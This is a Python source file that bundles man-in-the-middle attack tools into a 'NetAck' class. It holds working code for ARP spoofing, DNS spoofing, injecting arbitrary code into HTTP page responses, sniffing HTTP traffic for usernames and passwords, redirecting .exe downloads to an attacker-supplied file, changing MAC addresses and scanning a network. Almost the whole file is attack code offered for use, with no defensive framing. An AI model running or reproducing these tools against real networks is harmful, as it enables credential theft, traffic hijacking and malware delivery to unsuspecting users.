import re
import subprocess
import scapy.all as scapy
import netfilterqueue
from scapy.layers import http
import time

class Code_Injector:

    def __init__(self, c):
        self.injection_code = c

    def set_load(self,packet,load):
        packet[scapy.Raw].load = load

        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum

        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            try:
                load = scapy_packet[scapy.Raw].load.decode()
                if scapy_packet[scapy.TCP].dport == 80:
                    print("[+] Request")
                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

                elif scapy_packet[scapy.TCP].sport == 80:
                    print("[+] Response")
                    load = load.replace("<body>", "<body>" + self.injection_code)
                    content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                    if content_length_search and "text/html" in load:
                        content_length = content_length_search.group(1)
                        new_content_length = int(content_length) + len(self.injection_code)
                        load = load.replace(content_length, str(new_content_length))

                if load!= scapy_packet[scapy.Raw].load :
                    new_packet = self.set_load(scapy_packet, load)
                    packet.set_payload(bytes(new_packet))
            except UnicodeDecodeError:
                pass

        packet.accept()


    def start(self):
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.process_packet)
        queue.run()

class Sniffer:
    def __init__(self, interface):
     scapy.sniff(iface=interface, store=False, prn=self.process_sniffed_packet)

    def get_url(self, packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def get_login_info(self, packet):
     if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "usr", "password", "passcode", "pass"]
        for keyword in keywords:
            if keyword in str(load):
               return load

    def process_sniffed_packet(self, packet):
        if packet.haslayer(http.HTTPRequest):
          url = self.get_url(packet)
          print("[+] HTTP Request >>" + str(url))
        login_info = self.get_login_info(packet)

        if login_info:
            print("\n\n[+] Possible username/password >>" + str(login_info) +"\n\n")

class FakeDownload:


    def __init__(self, f):
        print("[+]Intercepting downloading file!")
        self.ack_list = []
        self.file = f

    def set_load(self,packet, load):
        packet[scapy.Raw].load = load

        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum

        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                if ".exe" in scapy_packet[scapy.Raw].load.decode():
                    print("[+] exe Request")
                    self.ack_list.append(scapy_packet[scapy.TCP].ack)

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in self.ack_list:
                    self.ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    modified_packet = self.set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + self.file + "\n\n")


                    packet.set_payload(bytes(modified_packet))

        packet.accept()


    def start(self):
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.process_packet)
        queue.run()


class NetworkScanner:

	def scan(self,ip):
		arp_request = scapy.ARP(pdst=ip)
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcadt = broadcast/arp_request
		answered_list = scapy.srp(arp_request_broadcadt, timeout=1, verbose = False)[0]

		clients_list = []
		for element in answered_list:
			client_dict = {"ip":element[1].psrc,"mac":element[1].hwsrc}
			clients_list.append(client_dict)
		self.print_result(clients_list)

	def print_result(self,results_list):
		print("\nIP\t\t\tMAC Address\n-------------------------------------------------------------------------")
		for client in results_list:
			print(client["ip"] + "\t\t" + client["mac"])

class MAC:

	def change_mac(self,interface, new_mac):
		interface = interface
		new_mac = new_mac
		print("[+] Changing MAC address for " + interface + " to " + new_mac)
		subprocess.call(["ifconfig", interface , "down"])
		subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
		subprocess.call(["ifconfig", interface, "up"])


	def get_current_mac(self, interface):
		ifconfig_result = subprocess.check_output(["ifconfig", interface])
		mac_address_search_result = re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result.decode())

		if mac_address_search_result:
			return mac_address_search_result.group(0)
		else:
			print("[-]MAC address in sot available")

	def start(self, interface, new_mac):
		current_mac = self.get_current_mac(interface)
		print("Current MAC = " + str(current_mac))
		self.change_mac(interface, new_mac)

		current_mac = self.get_current_mac(interface)
		if current_mac == new_mac:
		    print("[+] MAC address was successfully changed to " + current_mac)
		else:
		    print("[-] MAC address did not changed.")


class DNSSpoof:

	def __init__(self, t, r):
		self.target = t
		self.redirect_to = r
		subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

	def process_packet(self, packet):
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname = scapy_packet[scapy.DNSQR].qname
			if self.target in str(qname):
				print("[+] Spoofing target")
				answer = scapy.DNSRR(rrname=qname, rdata= self.redirect_to)
				scapy_packet[scapy.DNS].an = answer
				scapy_packet[scapy.DNS].ancount = 1



			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum


			packet.set_payload(bytes(scapy_packet))

		packet.accept()

	def start(self):
		queue = netfilterqueue.NetfilterQueue()
		queue.bind(0, self.process_packet)
		queue.run()

class ArpSpoof:

	def get_mac(self, ip):
		arp_request = scapy.ARP(pdst=ip)
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcadt = broadcast / arp_request
		answered_list = scapy.srp(arp_request_broadcadt, timeout=1, verbose=False)[0]
		return answered_list[0][1].hwsrc


	def spoof(self, target_ip, spoof_ip):
		target_mac = self.get_mac(target_ip)
		packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
		scapy.send(packet, verbose=False)

	def restore(self, destination_ip, source_ip):
		dst_mac = self.get_mac(destination_ip)
		src_mac = self.get_mac(source_ip)
		packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dst_mac , psrc = source_ip, hwsrc = src_mac)
		scapy.send(packet, count = 4, verbose = False)


	def start(self, target_ip, gateway_ip):

		try:

			subprocess.call(r'echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)


			sent_packets_count = 0
			while True:
				self.spoof(target_ip, gateway_ip)
				self.spoof(gateway_ip, target_ip)
				sent_packets_count += 2
				print("\r[+] Packets sent :" + str(sent_packets_count), end="")
				time.sleep(2)
		except KeyboardInterrupt:
			print("\n\n[+] Detected CTR + C ....... Quiting.")
			self.restore(target_ip, gateway_ip)
			self.restore(gateway_ip, target_ip)

class NetAck:

    def arpspoof(self, target_ip, gateway_ip):
        arp = ArpSpoof()
        arp.start(target_ip, gateway_ip)

    def dnsspoof(self, target_site, redirect_to):
        dns = DNSSpoof(target_site, redirect_to)
        dns.start()

    def macchanger(self, interface, newmac):
        mac = MAC()
        mac.start(interface, newmac)

    def scan(self,ip):#ip is a specific ip or a range of ip
        sc = NetworkScanner()
        sc.scan(ip)

    def codeinjector(self, code):
        ci = Code_Injector(code)
        ci.start()

    def sniffer(self, interface):
        sn = Sniffer(interface)

    def fileinterceptor(self, file):
        fi = FakeDownload(str(file))
        fi.start()
